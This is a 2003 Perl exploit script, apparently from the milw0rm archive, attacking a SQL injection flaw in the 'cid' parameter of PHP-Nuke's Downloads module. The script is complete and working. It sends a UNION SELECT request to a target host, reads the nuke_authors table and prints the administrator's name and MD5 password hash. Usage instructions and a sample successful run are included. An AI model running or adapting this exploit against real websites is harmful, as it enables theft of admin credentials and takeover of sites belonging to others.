#!/usr/bin/perl -w
use IO::Socket;

########################################
## THIS CODE PUBLIC NOW  =)))        ##
########################################
## __________               ___ ___   ##
## \______   \__ __  ______/   |   \  ##
##  |       _/  |  \/  ___/    _    \ ##
##  |    |   \  |  /\___ \\         / ##
##  |____|_  /____//____  >\___|_  /  ##
##         \/           \/       \/   ##
########################################
## based on 'cid' sql injection vuln
## in Download module, more info about
## this vuln u can see here:
## http://rst.void.ru/texts/advisory10.htm
########################################
## work only on mysql version > 4.0
########################################
## tested on PHP-Nuke versions: 6.9, 6.0, 6.5
## C:\>r57phpnuke.pl 127.0.0.1 /phpnuke/ admin
##
## server : 127.0.0.1
## folder : /phpnuke/
## aid    : admin
##
## [~] prepare to connect...
## [+] connected
## [~] prepare to send data...
## [+] success
## [~] wait for reply...
## [+] w00t...
## [+] USER: admin
## [+] MD5 HASH: 5f4dcc3b5aa765d61d8327deb882cf99
##
########################################

if (@ARGV < 3)
{
print "#############################################################\n";
print " r57nuke-cid.pl - PHP-NUKE 'cid' sql injection exploit\n";
print " by RusH security team // www.rsteam.ru , http://rst.void.ru\n";
print " coded by 1dt.w0lf // r00t\@rsteam.ru // 17.09.2003\n";
print "#############################################################\n";
print " Usage:\n";
print " r57nuke-cid.pl <host> </folder/> <aid>\n";
print "\n";
print " <host> - host for attack\n";
print " </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\n";
print " <aid> - user aid , nick ( admin , blabla )\n";
print "#############################################################";
exit();
}

$server = $ARGV[0];
$folder = $ARGV[1];
$aid = $ARGV[2];

print "\n";
print "server : $server\n";
print "folder : $folder\n";
print "aid    : $aid\n";
print "\n";
$success = 0;
$path_download = "modules.php?name=Downloads&d_op=viewdownload&cid=2%20
UNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--";
$GET = $folder . $path_download;
print "[~] prepare to connect...\n";
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || 
die "[-] connect failed\n";
print "[+] connected\n";
print "[~] prepare to send data...\n";
print $socket "GET $GET HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Http-Referer: http://microsoft.com\n";
print $socket "User-Agent: Internet Explorer 6.0\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
print "[+] success\n";
print "[~] wait for reply...\n";
while ($answer = <$socket>)
{
 #print "$answer";
 if ($answer=~/(&amp;cid=)(\w)(\"><b>)($aid)(<\/b><\/a><\/font>)(.{0,20})
(<font class=\"content\">)(.{32})(<\/font>)/)
 {
 $success = 1;
 print "[+] w00t...\n";
 print "[+] USER: $1 \n[+] MD5 HASH: $6\n";
 }
}
if ($success == 0) { print "[-] exploit failed =(\n"; }

# milw0rm.com [2003-12-21]
